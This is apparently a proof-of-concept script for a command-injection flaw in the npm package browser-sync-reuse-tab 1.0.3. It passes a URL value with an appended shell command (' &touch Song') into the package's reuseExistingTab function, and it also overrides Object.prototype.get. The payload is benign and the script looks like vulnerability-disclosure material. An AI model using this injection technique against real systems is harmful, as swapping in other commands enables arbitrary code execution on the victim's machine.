/**
 * browser-sync-reuse-tab@1.0.3
 * the injection point is located in line 40 of index file "index.js" of the 
 * package in function reuseExistingTab().
 */

var root = require("browser-sync-reuse-tab");
Object.prototype.get = function (key) {return this.key};
var browserSync = {
  instance: {
    options: {
      urls: {urlToOpen: " &touch Song"}
    }
  }
}
root(browserSync,true)();

